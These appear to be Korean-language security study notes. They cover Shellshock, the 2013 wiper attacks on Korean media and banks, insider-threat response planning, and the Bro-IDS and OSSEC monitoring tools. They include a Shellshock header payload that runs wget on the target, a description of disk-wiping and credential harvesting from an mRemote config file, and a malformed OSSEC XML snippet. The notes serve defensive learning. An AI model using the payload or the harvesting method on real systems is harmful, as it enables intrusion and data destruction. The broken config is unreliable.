# 보안 위협 정보 수집

## 보안 위협 이해

### 애플리케이션 취약점

2014년에 발생할 셸 쇼크(CVE-2014-6271, CVE-2014-7169) 취약점에 대해 알아보자.

2014년 9월 사용된 공격 방식은 bash 환경 변수로 저장되는 헤더 항목에 공격 구문을 삽입해 취약한 시스템을 공격하는 방식이었다.

```bash
telnet [ip] 80
GET /cgi-bin/test-cgi
...
User-Agent: (){:;}; wget -O /tmp/tmp # wget 명령을 이용해 다운로드한 파일을 tmp 디렉터리에 tmp 파일명으로 저장한다
```

대부분의 해킹 공격은 취약한 시스템을 공격하는 걸로 끝나지 않고, 자동화된 공격을 통해 취약한 시스템 접근을 확보한 후에 경유 시스템으로 많이 사용된다.

사례를 살펴보면

* 11/4: IDC 서버 이상 발견
  11/3 12:00부터 외부로 불생된 SSH 사전식 대응 공격 확인

* 11/4: 원인 분석 수행(침해사고 분석)
  BashShell 취약점 공격 확인
  악성코드 유입: http:// ... /bbs/skin/zero_vote/cpan_root

* 분석 결과 요약
  11/01: Bash shell 취약점 공격, 악성코드 설치
  11/03: 외부로 SSH 무작위 사전식 대입 공격
  11/04: 사고 인지 후 시스템 분석

많은 경우 관리 허점을 이용하며, 아직도 2006년 발표된 제로보드 취약점이 사용되고 있다.

### 지능형 지속 공격

2013년 3월 20일 국내 언론사 몇 곳의 업무 관련 시스템들이 동시 다발적으로 파괴되는 사태가 발생핬다. 이로 인해 실제로 방송이 중단되기도 했다.

* 2010년 이후 발생된 주요 사이버 공격 사례

  11/3/4 : 청와대, 금융 기관, 네이버 대상 DDoS 공격
  11/4/12 : 농협 전산망 마비
  13/3/20 : 주요 언론사 및 금융기관 전산망 동시 장애
  13/6/25 : 청와대 홈페이지 변조, 언론사 및 정부 전산센터 공격
  14/12/15 : 한국수자력발전 내부 정보 유출 공개

지능형 지속 공격은 처음 공격에서 최종 목표를 실행하기까지 최소 6개월 이상 관리자나 사용자 몰래 활동한다.

2015년 미국의 FBI 수배자 명단에 중국의 61398 부대 장교가 올라간 사건이 있었다. 이 장교들의 실명과 부대 명칭은 외국계 보안 업체를 통해 실체가 밝혀지기 시작했고 MANDIANT APT 1 보고서를 통해 APT 기법을 사용하는 해커 그룹의 특징과 실체를 구체적으로 밝혀냈다.

3/20 사태로 돌아가자. 공격 당시 공격자는 이미 확보했던 정보를 이용해 자동화된 스크립트 형태로 시스템 파괴 명령을 자동으로 실행시켰다. 방화벽 로그와 침해 시스템의 시스템 로그, 침입탐지 시스템 로그 등 사건에 연관된 모든 보안 로그를 분석했고, 일련의 추적을 통해 공격자의 타임 테이블을 구성했다.

공격 특징은 사용자 대역, 사무실 대역에 대한 악성코드 감염 / 감염된 내부 시스템을 경유해 서버 하드 디스크 파괴이다.

타임 테이블은

* 사전 준비
  웹쉘 업로드(2012/03/22, 2012/06/20) : 공격 대상 서버에 웹쉘 업로드, 파일 탈취 및 SSH 통신
  애플리케이션 공격(2012/9/4) : PHP 취약점을 이용한 원격 명령 실행
* 성공
  정보 유출(2012/10/13) : 공격 대상 서버에 웹쉘 업로드, 소스 압축 후 유출
  악성코드 배포(2012/10/18) : 공격 대상 서버에 악성코드 유포 링크 삽입
  악성코드 감염(2013/02/08) : 이미지 파일(bd.gif)를 이용해 악성코드 설치
  원격 접근(2013/03/03 00:54:21) : 데이터센터(IDC) 서버 접근
* 확산
  원격 접근 : (03/19 AM 2~4) 단일 소스 IP에서 다수 3389, AM 4~5 다수 SSH
  악성코드 감염 : (03/20 03:53:30) crw.exe 파일 동시 감염(10대 이상)
* 파괴
  2013/03/20 14시 전후 시스템 OS 부팅 영역 손상

공격자는 수년 전부터 다양한 방면으로 공격을 시도했다. 서버를 대상으로 App 취약점윌 이용해 반복적으로 웹쉘 설치 시도, 이후 내부 시스템에 대한 정보(네트워크, App, 사용자 접속 정보)를 꾸준히 수집했다.
때로 웹 서버에 악성코드를 삽입해 일반 사용자 및 내부 사용자에게 악성코드를 감염시키기도 했다.
공격받은 시스템의 복구/차단 과정을 반복적으로 관찰해 가장 효율적인(짧은 시간에 가장 많은 경로로 접근 가능한) 경로를 파악했다.
13/3월 사용자들이 많은 사무실 PC에 대해 공격을 시도해 시스템 관리자 PC가 악성코드에 감염됬고, 관리자 시스템에서 서버 접근 정보(IP, ID, PW)를 수집해 공격을 감행했다.

* 활동 내역
  * 악성코드 감염
    `Crw.exe`는 AV 프로그램에서 진단하지 못하는 타겟 맞춤형 악성코드이다.
    (MD5, SHA-1, Size(Byte)값)

    해당 악성코드는 시스템에 서비스로 등록되 자동 실행된다.
    [HKLM\SYSTEM\CurrentControlSet\Services\xmlprov Defenser]
    ImagePath=%SystemRoot%\System32/svchost.exe -k netsvcs

  * 정보 수집(원격 접속)
    특정 경로의 환경 설정 파일 정보 획득, 문자열 추출을 통해 root 패스워드 확보
    [%appdata%/Felix_Deimel/mRemote/confCons.xml]

  * 시스템 파괴
    최대 10개까지 물리 디스크(\\PHYSICALDRIVE0~9)을 열어 물리 디스크의 MBR, VBR을 PRINCPES 문자열로 반복 기록, 손상
    /kernel,/usr,/etc,/home 폴더를 차례로 rm 명령어를 이용해 삭제

다음 유형은 내부자에 의해 발생될 수 있는 기업의 내부 위협 시나리오다.

### 내부 통제

대형 통신사 대리점에서 내부 정보 조회 프로그램을 이용해 대규모 정보 유출 사건이 일어났다. 이 사건은 정상적인 조회를 가장한 정보 유출 사건으로, 뉴스를 통해 많이 보도됬다.

IT 관리 부서는 외부에서 발생하는 위협을 차단, 대응해야 하며, 내부에서 발생되는 권한 위반, 정책 위반 행위에 대해서도 모니터링하고 대응해야 한다.

* 퇴직자에 의한 내부 자료 유출, 프로젝트 수행 시 발생되는 고객 DB 정보 접근 제어 등 다양한 시나리오가 있다.
  실제 어떤 위협이 발생될지 모르는 상황에서는 위협 대응을 위해 많은 인적 자원, 시스템 자원을 사용하고 있다.

다양한 기업 IT 환경에서 좀 더 효율적인 IT 자산 운영을 위해 필요한 가이드에 대해 내부적/체계적으로 관리할 필요가 잇다.

샘플 시나리오는

* 애플리케이션 통신을 통한 문서 정보 통신

* DB 관련 파일 전송 통신

이고, 이 위협 시나리오가 일어났을 때 어떤 상황에 해당할 수 있는지 상황을 다음 표에 정의한다.

* 애플리케이션 통신을 통한 문서 정보 통신
  단순 시도인지?
  통신이 실제로 성공했는지
* DB 관련 파일 전송 통신
  단순 시도인지?
  통신이 실제로 성공했는지
  유출이 된 것인지

상황이 정의됬다면 상황에 따라 필요한 조치, 즉 액션 플랜을 구분할 수 있다.

* 애플리케이션 통신을 통한 문서 정보 통신
  단순 시도인지? : 선보고 후조치
  통신이 실제로 성공했는지 : 선조치 후보고
* DB 관련 파일 전송 통신
  단순 시도인지? : 선보고 후조치
  통신이 실제로 성공했는지 : 선조치 후보고
  유출이 된 것인지 : 선조치 후보고, 내부 상황 전파

각각 시나리오에 대한 대응 체계를 수립해 내부에서 정보 유출이 발생하거나 심각한 상황일 때 좀 더 일사 분란하게 상황을 정의하고 대응해 나갈수 있게 내부 지침을 만들 수 있다.

정의된 해당 지침 문서를 업무에 적용하려면 다음과 같은 프로세스로 도식화할 수 있다.

|관제 영역|보고|파트너|
|-------------------|
|탐지-검증-대응|대응 보고|예외 처리 절차|
|의심스러운 활동 탐지, 보안 사고 여부 판단, 위험/위협 여부 확인|(취약성 없을 시) 침해 시도 대응, (취약성 있을 시)공격 영향 범위 정의\,보고서 분류 : 위협 분석 보고서, 등급 분류: 위협 등급 정의|보안 위협, 모니터링, 반복 분석(일간/주간/월간), False Positive, False Negative, 예외 처리 승인 및 반영

기업과 조직에서는 다양한 보안 업무 목적에 따라 다양한 솔루션을 사용하고 있다. 대부분의 보안 업무가 보안 솔루션에서 발생되는 이벤트를 시작으로 이뤄진다.

업무 목적에 따라 어떤 분석 솔루션을 이용해야 할지 살펴보자.

## 침입 분석 솔루션

가트너는 2013년 보고서에서 위협 방어 스타일 5가지를 정의했다. 엔드포인트에서 네트워크까지 위협을 방어하는 방법을 정의한 것인데, 그 중 네트워크를 기반으로 한 위협 방어 방법을 살펴볼 것이다.
(5단계는 네트워크 차단 : 네트워크 트래픽 분석, 네트워크 포렌식, 페이로드 : 페이로드 분석, 엔드포인트 : 엔드포인트 행동 분석, 엔드포인트 포렌식이다)

네트워크를 통해 발생되는 위협을 분석하는 방법은 크게 3가지로 구분할 수 있다.

* 네트워크 기반의 침입탐지 시스템
  실시간으로 수집되는 네트워크 패킷 분석을 통해 시그니처 기반의 공격을 탐지한다.
* 모든 네트워크 패킷을 일정 기간 보관 후 사고가 발생할 경우 사고 발생 지점의 전체 네트워크 패킷을 분석
  네트워크 포렌식이라고 불린다.
* 네트워크 페이로드에 포함된 정보를 분석해 애플리케이션 분석 수행 (차세대 제품들의 분석 영역)
  애플리케이션 분석은 FB, 카카오톡 메신저처럼 자체 통신 프로토콜에 의한 분석이다.
* (네 번째, 다섯 번째) : 엔드포인트 기반 행위 분석, 포렌식 (법의학 관점에서 증거 채증 시 활용)

수집된 패킷을 공격 시그니처와 비교해 공격 여부를 탐지하는 동작 방식이 전통적인 네트워크 위협 탐지 기법이다. 많은 사용 네트워크 보안 제품들이 Snort 엔진을 기반으로 동작한다. 즉 잘 알려진 공격 패턴을 네트워크 패킷에서 찾아 공격 여부를 정의한다.

이는 제로데이 공격, APT 공격을 탐지하지 못하므로, 시그니처를 모르는 상태에서 대응하기 위한 해법이 필요해졌고 이런 관점에서 시작된 차세대 침입방지 시스템의 오픈소스 버전이라고 할 수 있는 Bro-IDS에 대해 알아보겠다.

### 네트워크 침입탐지 시스템

[Bro-IDS](https://www.bro.org)

프로토콜 기반의 침입탐지 엔진을 가지고 있다. 우리가 흔히 알고 있는 http, ftp, ssh 등 애플리케이션 기반으로 네트워크 트래픽을 분석하는 탐지 엔진이다. 분석 결과는 탐지된 모든 개별 통신에 대해 로그로 기록한다.

웹을 통한 공격이 발생되면, 패턴 기반 침입탐지 시스템은 공격으로 인식된 단일 패킷과 관련된 로그를 기록한다.
App 기반 탐지 방식은 모든 개별 통신 패킷을 로그로 남긴다. 웹 관련 파라미터(IP,Port,연결 링크 수, HTTP 메소드, 호스트면, 브라우저 정보, 요청 및 응답에서 크기, 파일 형식 등)을 모두 기록한다.
최근 위협의 추세가 제로데이 공격 등 탐지 시그니처가 없는 상황에서 위협에 대응할 수 있는 대안이 될 수 있는 탐지 시스템이다.
Bro는 공격과 관련된 이벤트명은 없고 일부 공격 이벤트 탐지 이벤트가 존재한다. Brute-Force, MD5 해시 정보를 이용한 악성코드 정보 조회를 제공하기는 하지만 가장 핵심이 되는 부분은 애플리케이션에 대해 분석하고 이를 모두 로그로 남기는 것이다.
암호화 통신 또한 내용은 볼 수 없지만 세션 로그로 어떤 포트를 통해 언제부터 언제가지 얼마나 많은 데이터를 주고받았는지는 파악할 수 있다.
모든 로그를 남기기 떄문에 감사 기능으로도 활용할 수 있으나, 충분한 저장 공간을 필요로 하지만 모든 보안 솔루션은 필요에 따라 최적화해 사용 가능하다.

### 호스트 기반 침입탐지 시스템

네트워크 기반은 7-Layer 통신을 분석해 로그를 남기며, 호스트 시스템에서 운영체제에서 발생되는 로그를 분석해 기록하는 역할을 하는 소프트웨어, 솔루션들이 많이 있다.

본론으로 들어가, 해킹과 관련된 네트워크 행위를 분석하다 보면 실제 시스템에 어떤 영향을 발생시켰는지 직접 확인해야 하는 경우가 상당히 많다.

* 외부에서 IDC 서버나 사무실 대역 SSH, 윈도우 원격 데스크톱에 로그인을 시도하는 경우가 발생할 수 있다.
  이 때 실제 로그인 성공 여부에 대해 윈도우/리눅스 기반 시스템 메시지를 확인해보면 로그인 성공 여부에 대해 판단할 수 있다.
* 의심스러운 (80, 443, 25, 21등 포트가 아닌) 포트를 이용해 외부와 통신하는 경우
  암호화 통신 시 패킷을 통한 확인이 불가능하므로 실제 해당 시스템의 프로세스 목록, 열려진 포트를 확인해야 할 필요가 있다.
* 시스템의 특정 시스템 경로(system32, windows, /dev/, uninstall)에 파일이 추가되는 경우
  악성코드에 의해 시스템 파일 변조, 숨김 파일 추가되는 경우에 대해서도 인지가 필요한 경우가 발생한다.

악성코드에 감염된 시스템은 외부 통신 연결을 시도한다. 이 시도는 프로세스 추적을 통해 확인하며, 프로세스 분석 프로그램을 이용해 개별 프로세스마다 사용하는 파일, 통신 포트 정보를 확인할 수 있다. 또한 파일 설명, 버전, 프로세스 서비스, 추가된 날짜 등 또한 알아볼 수 있다.

엔드포인트 시스템에서 발생하는 이슈에 대한 보안 침해사고와 연계해 분석할 필요가 있을 때 호스트 기반의 솔루션을 이용해 어떻게 정보룰 수집하고 분석할 수 있는지 오픈소스를 기반으로 살펴보자.

#### OSSEC

OSSEC은 윈도우/리눅스 기반의 로그 및 시스템 정보를 수집하는 솔루션이다. 중앙 서버와 Agent를 통해 정보를 수집하며, 리눅스 계열 시스템의 경우 SSH 통신으로 로그 수집이 가능하다.
엔드포인트 솔루션의 경우 백신, 데이터 유출 방지(DLP), 매체 제어, 무결성 감시 등 목적에 따라 다양한 제품들이 사용된다. 오픈소스 기반 OSSEC의 경우 시스템 로그 감시 및 파일 시스템 무결성 감시가 가장 대표적인 기능이다. 윈도우/리눅스 시스템의 보안 로그를 수집해 내부적으로 이상 행위를 분석하는 엔진을 갖고 있다.

특징적인 기능 중 커스텀하게 시스템 정보를 수집할 수 있는 기능이 있다. 이 기능은 시스템에 지정한 명령을 실행시키고 결과를 수집하는 기능인데, 이 기능을 응용해 시스템이 악성코드에 감염되는지 여부를 모니터링할 수 있다.

해커에 의해 공격을 당하면 시스템에 악성코드가 설치되고, 악성 프로그램에 의해 새로운 프로세스가 생성되고 외부로 공격자에게 원격으로 연결된다. 원격 연결을 통해 IRC 채널에 접속할 수도 있고, 공격자가 배포하는 또 다른 악성코드를 다운받는다.

OSSEC 솔루션을 이용한 방법 중 하나로, 지정된 시간 간격(기본 30초)로 시스템에 접속해 명령을 실행하고 실행된 명령 결과에 차이가 발생할 경우 시스템 알림을 발생시킬 수 있다.

서버 설정 파일을 열고,

```xml
<agentless>
    <!-- ... -->
    <frequency>30</freq>
    <arguments>netstat -tnpl4
</agentless>
```

30초 주기로 `netstat` 명령어를 실행해, 예를 들어 130번 Client에 기존에 없던 80번 포트가 새로 오픈됬고, 해당 포트의 PID는 15851, 프로그램 이름 `httpd`를 확인할 수 있다.

업무 목적에 따라 어떤 솔루션을 사용할 수 있는지 살펴보았고, 경우에 따라 기업/조직의 환경에 맞춘 정보를 활용/수집해야 할 경우도 있다.

## 패킷 정보 수집



